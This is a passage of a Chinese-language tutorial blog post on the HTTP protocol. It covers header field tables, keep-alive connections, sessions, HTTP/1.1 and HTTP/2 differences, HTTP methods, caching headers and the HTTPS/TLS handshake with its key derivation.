<td align="left">Upgrade</td>
<td align="left">升级为其他协议</td>
</tr>
<tr>
<td align="left">Via</td>
<td align="left">代理服务器的相关信息</td>
</tr>
<tr>
<td align="left">Warning</td>
<td align="left">错误通知</td>
</tr>
</tbody></table>
<h3 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h3><table>
<thead>
<tr>
<th align="left">首部字段名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Accept</td>
<td align="left">用户代理可处理的媒体类型</td>
</tr>
<tr>
<td align="left">Accept-Charset</td>
<td align="left">优先的字符集</td>
</tr>
<tr>
<td align="left">Accept-Encoding</td>
<td align="left">优先的内容编码</td>
</tr>
<tr>
<td align="left">Accept-Language</td>
<td align="left">优先的语言（自然语言）</td>
</tr>
<tr>
<td align="left">Authorization Web</td>
<td align="left">认证信息</td>
</tr>
<tr>
<td align="left">Expect</td>
<td align="left">期待服务器的特定行为</td>
</tr>
<tr>
<td align="left">From</td>
<td align="left">用户的电子邮箱地址</td>
</tr>
<tr>
<td align="left">Host</td>
<td align="left">请求资源所在服务器</td>
</tr>
<tr>
<td align="left">If-Match</td>
<td align="left">比较实体标记（ETag）</td>
</tr>
<tr>
<td align="left">If-Modified-Since</td>
<td align="left">比较资源的更新时间</td>
</tr>
<tr>
<td align="left">If-None-Match</td>
<td align="left">比较实体标记（与 If-Match 相反）</td>
</tr>
<tr>
<td align="left">If-Range</td>
<td align="left">资源未更新时发送实体 Byte 的范围请求</td>
</tr>
<tr>
<td align="left">If-Unmodified-Since</td>
<td align="left">比较资源的更新时间（与 If-Modified-Since 相反）</td>
</tr>
<tr>
<td align="left">Max-Forwards</td>
<td align="left">最大传输逐跳数</td>
</tr>
<tr>
<td align="left">Proxy-Authorization</td>
<td align="left">代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td align="left">Range</td>
<td align="left">实体的字节范围请求</td>
</tr>
<tr>
<td align="left">Referer</td>
<td align="left">对请求中 URI 的原始获取方</td>
</tr>
<tr>
<td align="left">TE</td>
<td align="left">传输编码的优先级</td>
</tr>
<tr>
<td align="left">User-Agent</td>
<td align="left">HTTP 客户端程序的信息</td>
</tr>
</tbody></table>
<h3 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><table>
<thead>
<tr>
<th align="left">首部字段名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Accept-Ranges</td>
<td align="left">是否接受字节范围请求</td>
</tr>
<tr>
<td align="left">Age</td>
<td align="left">推算资源创建经过时间</td>
</tr>
<tr>
<td align="left">ETag</td>
<td align="left">资源的匹配信息</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">令客户端重定向至指定 URI</td>
</tr>
<tr>
<td align="left">Proxy-Authenticate</td>
<td align="left">代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td align="left">Retry-After</td>
<td align="left">对再次发起请求的时机要求</td>
</tr>
<tr>
<td align="left">Server HTTP</td>
<td align="left">服务器的安装信息</td>
</tr>
<tr>
<td align="left">Vary</td>
<td align="left">代理服务器缓存的管理信息</td>
</tr>
<tr>
<td align="left">WWW-Authenticate</td>
<td align="left">服务器对客户端的认证信息</td>
</tr>
</tbody></table>
<h3 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><table>
<thead>
<tr>
<th align="left">首部字段名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Allow</td>
<td align="left">资源可支持的 HTTP 方法</td>
</tr>
<tr>
<td align="left">Content-Encoding</td>
<td align="left">实体主体适用的编码方式</td>
</tr>
<tr>
<td align="left">Content-Language</td>
<td align="left">实体主体的自然语言</td>
</tr>
<tr>
<td align="left">Content-Length</td>
<td align="left">实体主体的大小</td>
</tr>
<tr>
<td align="left">Content-Location</td>
<td align="left">替代对应资源的 URI</td>
</tr>
<tr>
<td align="left">Content-MD5</td>
<td align="left">实体主体的报文摘要</td>
</tr>
<tr>
<td align="left">Content-Range</td>
<td align="left">实体主体的位置范围</td>
</tr>
<tr>
<td align="left">Content-Type</td>
<td align="left">实体主体的媒体类型</td>
</tr>
<tr>
<td align="left">Expires</td>
<td align="left">实体主体过期的日期时间</td>
</tr>
<tr>
<td align="left">Last-Modified</td>
<td align="left">资源的最后修改日期时间</td>
</tr>
</tbody></table>
<h1 id="11-HTTP协议与各协议之间的关系"><a href="#11-HTTP协议与各协议之间的关系" class="headerlink" title="11. HTTP协议与各协议之间的关系"></a>11. HTTP协议与各协议之间的关系</h1><p>各种协议与HTTP协议之间的关系：</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E4%B8%8EHTTP%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.png" alt="HTTP与各协议之间的关系"></p>
<h1 id="12-HTTP长连接和短连接"><a href="#12-HTTP长连接和短连接" class="headerlink" title="12. HTTP长连接和短连接"></a>12. HTTP长连接和短连接</h1><p>在<code>HTTP/1.0</code>中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。</p>
<p>而从<code>HTTP/1.1</code>起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入这行代码：</p>
<figure class="highlight js"><figcaption><span>Connection:keep-alive</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。<span class="string">`Keep-Alive`</span> 不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。</span><br><span class="line"></span><br><span class="line">Httpd 守护进程，一般都提供了 <span class="string">`keep-alive timeout`</span> 时间设置参数。比如 nginx 的 <span class="string">`keepalive_timeout`</span>，和 Apache 的 <span class="string">`KeepAliveTimeout`</span>。这个 keepalive_timout 时间值意味着：一个 http 产生的 tcp 连接在传送完最后一个响应后，还需要保持 <span class="string">`keepalive_timeout`</span> 秒后，才开始关闭这个连接。</span><br><span class="line"></span><br><span class="line">当 httpd 守护进程发送完一个响应后，理应马上主动关闭相应的 tcp 连接，设置 <span class="string">`keepalive_timeout`</span> 后，httpd守护进程会想说：”再等等吧，看看浏览器还有没有请求过来”，这一等，便是 keepalive_timeout 时间。如果守护进程在这个等待的时间里，一直没有收到浏览发过来 http 请求，则关闭这个 http 连接。</span><br><span class="line"></span><br><span class="line">**HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。**但是需要区别于 TCP 的 keepalive。</span><br><span class="line"></span><br><span class="line">## HTTP Keep-alive 和 TCP keepalive</span><br><span class="line"></span><br><span class="line">在使用 TCP 长连接（复用已建立 TCP 连接）的场景下，需要对 TCP 连接进行保活，避免被网关干掉连接。</span><br><span class="line">在应用层，可以通过定时发送心跳包的方式实现。而 Linux 已提供的 TCP KEEPALIVE，在应用层可不关心心跳包何时发送、发送什么内容，由 OS 管理：OS 会在该TCP连接上定时发送探测包，探测包既起到连接保活的作用，也能自动检测连接的有效性，并自动关闭无效连接。</span><br><span class="line"></span><br><span class="line">所以，**HTTP 协议的 keep-alive 意图在于连接复用，同一个连接上串行方式传递请求-响应数据，TCP 的 keepalive 机制意图在于保活、心跳，检测连接错误。**</span><br><span class="line"></span><br><span class="line">## 长连接如何进行保活</span><br><span class="line"></span><br><span class="line">对于客户端而言，使用 TCP 长连接来实现业务的好处在于：在当前连接可用的情况下，每一次请求都只是简单的数据发送和接受，免去了 DNS 解析，连接建立，TCP 慢启动等时间，大大加快了请求的速度，同时也有利于接收服务器的实时消息。</span><br><span class="line"></span><br><span class="line">在使用TCP长连接的业务场景下，保持长连接的可用性非常重要。如果长连接无法很好地保持，在连接已经失效的情况下继续发送请求会导致迟迟收不到响应直到超时，又需要一次连接建立的过程，其效率甚至还不如直接使用短连接。而连接保持的前提必然是检测连接的可用性，并在连接不可用时主动放弃当前连接并建立新的连接。</span><br><span class="line"></span><br><span class="line">keepalive 是 TCP 保鲜定时器，当网络两端建立了 TCP 连接之后，闲置idle（双方没有任何数据流发送往来）了 <span class="string">`tcp_keepalive_time`</span> 后，服务器内核就会尝试向客户端发送侦测包，来判断 TCP 连接状况(有可能客户端崩溃、强制关闭了应用、主机不可达等等)。如果没有收到对方的回答(ack包)，则会在 <span class="string">`tcp_keepalive_intvl`</span> 后再次尝试发送侦测包，直到收到对方的 ack,如果一直没有收到对方的 ack,一共会尝试 <span class="string">`tcp_keepalive_probes`</span> 次，每次的间隔时间在这里分别是15s, 30s, 45s, 60s, 75s。如果尝试 <span class="string">`tcp_keepalive_probes`</span>,依然没有收到对方的 ack 包，则会丢弃该TCP连接。TCP 连接默认闲置时间是 <span class="number">2</span> 小时，一般设置为 <span class="number">30</span> 分钟足够了。</span><br><span class="line"></span><br><span class="line">![TCP中Keepalive工作流程](http:<span class="comment">//qiniu.xiaoming.net.cn/TCP中keepalive工作流程.png)</span></span><br><span class="line"></span><br><span class="line"># 13. HTTP是不保存状态的协议，如何保存用户状态？</span><br><span class="line"></span><br><span class="line">HTTP 是一种不保存状态，即无状态（stateless）协议。也就是说 HTTP 协议自身不对请求和响应之间的通信状态进行保存。那么我们保存用户状态呢？<span class="string">`Session`</span>机制的存在就是为了解决这个问题，<span class="string">`Session`</span>的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的<span class="string">`Session`</span>之后就可以标识这个用户并且跟踪这个用户了（一般情况下，服务器会在一定时间内保存这个<span class="string">`Session`</span>，过了时间限制，就会销毁这个<span class="string">`Session`</span>）。</span><br><span class="line"></span><br><span class="line">在服务端保存<span class="string">`Session`</span>的方法很多，最常用的就是内存和数据库(比如是使用内存数据库redis保存)。</span><br><span class="line"></span><br><span class="line">既然<span class="string">`Session`</span>存放在服务器端，那么我们如何实现<span class="string">`Session`</span>跟踪呢？大部分情况下，我们都是通过在<span class="string">`Cookie`</span>中附加一个<span class="string">`Session ID`</span>来方式来跟踪。</span><br><span class="line"></span><br><span class="line"><span class="string">`Cookie`</span>被禁用怎么办?</span><br><span class="line"></span><br><span class="line">最常用的就是利用 URL 重写把<span class="string">`Session ID`</span>直接附加在URL路径的后面。</span><br><span class="line"></span><br><span class="line"># 14. HTTP1.0和HTTP1.1主要区别是什么？HTTP2呢？</span><br><span class="line"></span><br><span class="line">HTTP1<span class="number">.0</span>最早在网页中使用是在<span class="number">1996</span>年，那个时候只是使用一些较为简单的网页上和网络请求上，而HTTP1<span class="number">.1</span>则在<span class="number">1999</span>年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1<span class="number">.1</span>也是当前使用最为广泛的HTTP协议。 主要区别主要体现在：</span><br><span class="line"></span><br><span class="line">- **长连接** : 在HTTP/<span class="number">1.0</span>中，默认使用的是短连接，也就是说每次请求都要重新建立一次连接。HTTP 是基于TCP/IP协议的,每一次建立或者断开连接都需要三次握手四次挥手的开销，如果每次请求都要这样的话，开销会比较大。因此最好能维持一个长连接，可以用个长连接来发多个请求。HTTP <span class="number">1.1</span>起，默认使用长连接 ,默认开启<span class="string">`Connection： keep-alive`</span>。 HTTP/<span class="number">1.1</span>的持续连接有**非流水线方式**和**流水线方式**。流水线方式是客户在收到HTTP的响应报文之前就能接着发送新的请求报文。与之相对应的非流水线方式是客户在收到前一个响应后才能发送下一个请求。</span><br><span class="line">- **错误状态响应码**:在HTTP1<span class="number">.1</span>中新增了<span class="number">24</span>个错误状态响应码，如<span class="string">`409`</span>（Conflict）表示请求的资源与资源的当前状态发生冲突；<span class="string">`410`</span>（Gone）表示服务器上的某个资源被永久性的删除。</span><br><span class="line">- **缓存处理** :在HTTP1<span class="number">.0</span>中主要使用<span class="string">`header`</span>里的<span class="string">`If-Modified-Since`</span>,<span class="string">`Expires`</span>来做为缓存判断的标准，HTTP1<span class="number">.1</span>则引入了更多的缓存控制策略例如<span class="string">`Entity tag`</span>，<span class="string">`If-Unmodified-Since`</span>,<span class="string">`If-Match`</span>,<span class="string">`If-None-Match`</span>等更多可供选择的缓存头来控制缓存策略。</span><br><span class="line">- **带宽优化及网络连接的使用**:HTTP1<span class="number">.0</span>中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1<span class="number">.1</span>则在请求头引入了<span class="string">`range`</span>头域，它允许只请求资源的某个部分，即返回码是<span class="number">206</span>（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</span><br><span class="line"></span><br><span class="line">## HTTP2与HTTP1区别</span><br><span class="line"></span><br><span class="line">### 二进制协议</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/<span class="number">2</span> 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”（frame）：头信息帧和数据帧。</span><br><span class="line"></span><br><span class="line">二进制协议的一个好处是，可以定义额外的帧。HTTP/<span class="number">2</span> 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。</span><br><span class="line"></span><br><span class="line">### 多工</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">2</span> 复用 TCP 连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。</span><br><span class="line"></span><br><span class="line">举例来说，在一个 TCP 连接里面，服务器同时收到了 A 请求和 B 请求，于是先回应 A 请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。</span><br><span class="line"></span><br><span class="line">这样双向的、实时的通信，就叫做多工（Multiplexing）。</span><br><span class="line"></span><br><span class="line">### 数据流</span><br><span class="line"></span><br><span class="line">因为 HTTP/<span class="number">2</span> 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">2</span> 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。</span><br><span class="line"></span><br><span class="line">数据流发送到一半的时候，客户端和服务器都可以发送信号（RST_STREAM帧），取消这个数据流。<span class="number">1.1</span>版取消数据流的唯一方法，就是关闭TCP连接。这就是说，HTTP/<span class="number">2</span> 可以取消某一次请求，同时保证TCP连接还打开着，可以被其他请求使用。</span><br><span class="line"></span><br><span class="line">客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。</span><br><span class="line"></span><br><span class="line">### 头信息压缩</span><br><span class="line"></span><br><span class="line">HTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如 Cookie 和 User Agent，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">2</span> 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用 gzip 或 compress 压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。</span><br><span class="line"></span><br><span class="line">### 服务器推送</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">2</span> 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。</span><br><span class="line"></span><br><span class="line">常见场景是客户端请求一个网页，这个网页里面包含很多静态资源。正常情况下，客户端必须收到网页后，解析HTML源码，发现有静态资源，再发出静态资源请求。其实，服务器可以预期到客户端请求网页后，很可能会再请求静态资源，所以就主动把这些静态资源随着网页一起发给客户端了。</span><br><span class="line"></span><br><span class="line"># 15. URI和URL的区别是什么？</span><br><span class="line"></span><br><span class="line">- **URI**(Uniform Resource Identifier) 是统一资源标志符，可以唯一标识一个资源。它包含 URL 和 URN</span><br><span class="line"></span><br><span class="line">![URI包含URL和URN](https:<span class="comment">//qiniu.xiaoming.net.cn/URI包含URL和URN.png)</span></span><br><span class="line"></span><br><span class="line">- **URL**(Uniform Resource Location) 是统一资源定位符，可以提供该资源的路径。它是一种具体的 URI，即 URL 可以用来标识一个资源，而且还指明了如何 locate 这个资源。</span><br><span class="line"></span><br><span class="line">URI的作用像身份证号一样，URL的作用更像家庭住址一样。URL是一种具体的URI，它不仅唯一标识资源，而且还提供了定位该资源的信息。</span><br><span class="line"></span><br><span class="line"># 16. HTTP和HTTPS的区别</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> **端口** ：HTTP的URL由<span class="string">`http://`</span>起始且默认使用端口<span class="string">`80`</span>，而HTTPS的URL由<span class="string">`https://`</span>起始且默认使用端口<span class="string">`443`</span>。</span><br><span class="line"><span class="number">2.</span> **安全性和资源消耗**： HTTP协议运行在TCP之上，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份。HTTPS是运行在SSL/TLS之上的HTTP协议，SSL/TLS 运行在TCP之上。**所有传输的内容都经过加密，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密**。所以说，HTTP 安全性没有 HTTPS高，但是 HTTPS 比HTTP耗费更多服务器资源。</span><br><span class="line"></span><br><span class="line">- **对称加密**：密钥只有一个，加密解密为同一个密码，且加解密速度快，典型的对称加密算法有DES、AES等；</span><br><span class="line">- **非对称加密**：密钥成对出现（且根据公钥无法推知私钥，根据私钥也无法推知公钥），加密解密使用不同密钥（公钥加密需要私钥解密，私钥加密需要公钥解密），相对对称加密速度较慢，典型的非对称加密算法有RSA、DSA等。</span><br><span class="line"></span><br><span class="line"># 17. HTTP包含了哪些方法</span><br><span class="line"></span><br><span class="line">客户端发送的请求报文的第一行为请求行，包含了方法字段</span><br><span class="line"></span><br><span class="line">## GET</span><br><span class="line"></span><br><span class="line">&gt; 获取资源</span><br><span class="line"></span><br><span class="line">当前网络请求中，绝大部分使用的是GET方法</span><br><span class="line"></span><br><span class="line">## POST</span><br><span class="line"></span><br><span class="line">&gt; 传输实体主体</span><br><span class="line"></span><br><span class="line">POST主要用来传输数据，而GET主要用来获取数据</span><br><span class="line"></span><br><span class="line">## PUT</span><br><span class="line"></span><br><span class="line">&gt; 上传文件</span><br><span class="line"></span><br><span class="line">由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>PUT /new.html HTTP/1.1<br>Host: example.com<br>Content-type: text/html<br>Content-length: 16</p>
<p>New File</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## DELETE</span><br><span class="line"></span><br><span class="line">&gt; 删除文件</span><br><span class="line"></span><br><span class="line">与PUT功能相反，并且同样不带验证机制</span><br><span class="line"></span><br><span class="line">## HEAD</span><br><span class="line"></span><br><span class="line">&gt; 获取报文首部</span><br><span class="line"></span><br><span class="line">和GET方法类似，但是不返回报文实体主体部分，主要用于确认URL的有效性以及资源更新的日期时间等</span><br><span class="line"></span><br><span class="line">## PATCH</span><br><span class="line"></span><br><span class="line">&gt; 对资源进行部分更新</span><br><span class="line"></span><br><span class="line">PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;js</span><br><span class="line">PATCH &#x2F;file.txt HTTP&#x2F;1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application&#x2F;example</span><br><span class="line">If-Match: &quot;e0023aa4e&quot;</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">[description of changes]</span><br></pre></td></tr></table></figure>

<h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><blockquote>
<p>查询支持的方法</p>
</blockquote>
<p>查询指定的URL能够支持的方法，会返回<code>Allow: GET,POST,HEAD,OPTIONS</code>这样的内容</p>
<h2 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h2><blockquote>
<p>要求在与代理服务器通信时建立通信隧道</p>
</blockquote>
<p>使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONNECT www.example.com:443 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<h2 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h2><blockquote>
<p>追踪路径</p>
</blockquote>
<p>服务器会将通信路径返回给客户端。发送请求时，在<code>Max-Forwards</code>首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。通常不会使用 TRACE，并且它容易受到<code>XST</code>攻击（Cross-Site Tracing，跨站追踪）。</p>
<h1 id="18-HTTP-缓存"><a href="#18-HTTP-缓存" class="headerlink" title="18. HTTP 缓存"></a>18. HTTP 缓存</h1><h2 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h2><p>HTTP/1.1 可以通过 <code>Cache-Control</code> 首部字段来控制缓存。</p>
<p>禁止进行缓存：</p>
<ul>
<li>no-store 指令规定不能对请求或响应的任何一部分进行缓存。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control: no-store</span><br></pre></td></tr></table></figure>

<p>强制确认缓存:</p>
<ul>
<li>no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure>

<p>私有缓存和公共缓存:</p>
<ul>
<li>private 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control: private</span><br></pre></td></tr></table></figure>

<ul>
<li>public 指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control: public</span><br></pre></td></tr></table></figure>

<p>缓存过期机制:</p>
<ul>
<li>max-age 指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。</li>
<li>max-age 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control: max-age&#x3D;31536000</span><br></pre></td></tr></table></figure>

<p>Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Expires: Wed, 04 Jul 2012 08:26:05 GMT</span><br></pre></td></tr></table></figure>

<p>在 HTTP/1.1 中，会优先处理 max-age 指令；<br>在 HTTP/1.0 中，max-age 指令会被忽略掉。</p>
<h2 id="缓存验证"><a href="#缓存验证" class="headerlink" title="缓存验证"></a>缓存验证</h2><p>需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 <a href="http://www.google.com/">http://www.google.com/</a> 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ETag: &quot;82e22293907ce725faf67773957acd12&quot;</span><br></pre></td></tr></table></figure>

<p>可以将缓存资源的 <code>ETag</code> 值放入 <code>If-None-Match</code> 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，否则返回 304 Not Modified。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If-None-Match: &quot;82e22293907ce725faf67773957acd12&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 <code>ETag</code> 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 <code>If-Modified-Since</code> 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 <code>304 Not Modified</code> 响应报文。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT</span><br><span class="line">If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT</span><br></pre></td></tr></table></figure>

<h1 id="19-HTTPS-流程"><a href="#19-HTTPS-流程" class="headerlink" title="19. HTTPS 流程"></a>19. HTTPS 流程</h1><p>首先是客户端（通常是浏览器）先向服务器发出加密通信的请求，请求包括了以下信息：</p>
<ul>
<li>支持的协议版本，比如TLS 1.0版。</li>
<li>一个客户端生成的随机数 random1，稍后用于生成”对话密钥”。</li>
<li>支持的加密方法，比如RSA公钥加密。</li>
<li>支持的压缩方法。</li>
</ul>
<p>服务器收到请求,然后响应，响应流程如下：</p>
<ul>
<li>确认使用的加密通信协议版本，比如TLS 1.0版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。</li>
<li>发送一个服务器生成的随机数random2，稍后用于生成”对话密钥”。</li>
<li>确认使用的加密方法，比如 RSA 公钥加密。</li>
<li>发送服务器证书。</li>
</ul>
<p>客户端收到证书之后会首先会进行验证，验证流程：</p>
<ol>
<li>我们知道 CA 机构在签发证书的时候，都会使用自己的私钥对证书进行签名</li>
<li>证书里的签名算法字段（例如： sha256RSA） 表示，CA 机构使用 sha256 对证书进行摘要，然后使用 RSA 算法对摘要进行私钥签名，而我们也知道 RSA 算法中，使用私钥签名之后，只有公钥才能进行验签。</li>
<li>如果我们使用的是购买的证书，那么很有可能，颁发这个证书的 CA 机构的公钥已经预置在操作系统中。这样浏览器就可以使用 CA 机构的公钥对服务器的证书进行验签。确定这个证书是不是由正规的 CA 机构颁发的。验签之后得到 CA 机构使用 sha256 得到的证书摘要，然后客户端再使用 sha256 对证书内容进行一次摘要，如果得到的值和验签之后得到的摘要值相同，则表示证书没有被修改过。</li>
<li>如果验证通过，就会显示安全字样，如果服务器购买的证书是更高级的 EV 类型，就会显示出购买证书的时候提供的企业名称。如果没有验证通过，就会显示不安全的提示。</li>
</ol>
<p>再然后客户端会生成随机数：</p>
<p>验证通过之后，客户端会生成一个随机数 <code>pre-master secret</code>，然后使用证书中的公钥进行加密，然后传递给服务器端</p>
<p>PreMaster secret</p>
<blockquote>
<p>PreMaster Secret 是在客户端使用 RSA 或者 Diffie-Hellman 等加密算法生成的。它将用来跟服务端和客户端在第一阶段产生的随机数结合在一起生成 Master Secret。在客户端使用服务端的公钥对PreMaster Secret 进行加密之后传送给服务端，服务端将使用私钥进行解密得到 PreMaster secret。也就是说服务端和客户端都有一份相同的 PreMaster secret 和随机数。<br>PreMaster secret 前两个字节是 TLS 的版本号，这是一个比较重要的用来核对握手数据的版本号，因为在第一阶段，客户端会发送一份加密套件列表和当前支持的 SSL/TLS 的版本号给服务端，而且是使用明文传送的，如果握手的数据包被破解之后，攻击者很有可能串改数据包，选择一个安全性较低的加密套件和版本给服务端，从而对数据进行破解。所以，服务端需要对密文中解密出来对的 PreMaster 版本号跟之前第一阶段的版本号进行对比，如果版本号变低，则说明被串改，则立即停止发送任何消息。</p>
</blockquote>
<p>再接下来就是生成密钥的过程，服务器收到使用公钥加密的内容，在服务器端使用私钥解密之后获得随机数pre-master secret，然后根据 radom1、radom2、pre-master secret 通过一定的算法得出 session Key 和 MAC 算法秘钥，作为后面交互过程中使用对称秘钥。</p>
<p>同时客户端也会使用 radom1、radom2、pre-master secret，和同样的算法生成 session Key 和 MAC 算法的秘钥。</p>
<p>生成 session Key 的过程中会用到 PRF(Pseudorandom Function 伪随机方法)来生成一个 key_block,然后再使用 key_block,生成后面使用的秘钥。</p>
<blockquote>
<p>PRF是在规范中约定的伪随机函数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key_block &#x3D; PRF(SecurityParameters.master_secret,&quot;key expansion&quot;,SecurityParameters.server_random + SecurityParameters.client_random);</span><br></pre></td></tr></table></figure>

<p>在信息交互过程中用到的秘钥有6个分别如下，客户端和服务器端分别使用相同的算法生成。</p>
<table>
<thead>
<tr>
<th align="left">秘钥名称</th>
<th align="left">秘钥作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">client_write_MAC_key[SecurityParameters.mac_key_length]</td>
<td align="left">客户端发送数据使用的摘要MAC算法</td>
</tr>
<tr>
<td align="left">server_write_MAC_key[SecurityParameters.mac_key_length]</td>
<td align="left">服务端发送数据使用摘要MAC算法</td>
</tr>
<tr>
<td align="left">client_write_key[SecurityParameters.enc_key_length]</td>
<td align="left">客户端数据加密，服务端解密</td>
</tr>
<tr>
<td align="left">server_write_key[SecurityParameters.enc_key_length]</td>
<td align="left">服务端加密，客户端解密</td>
</tr>
<tr>
<td align="left">client_write_IV[SecurityParameters.fixed_iv_length]</td>
<td align="left">初始化向量，运用于分组对称加密</td>
</tr>
<tr>
<td align="left">server_write_IV[SecurityParameters.fixed_iv_length]</td>
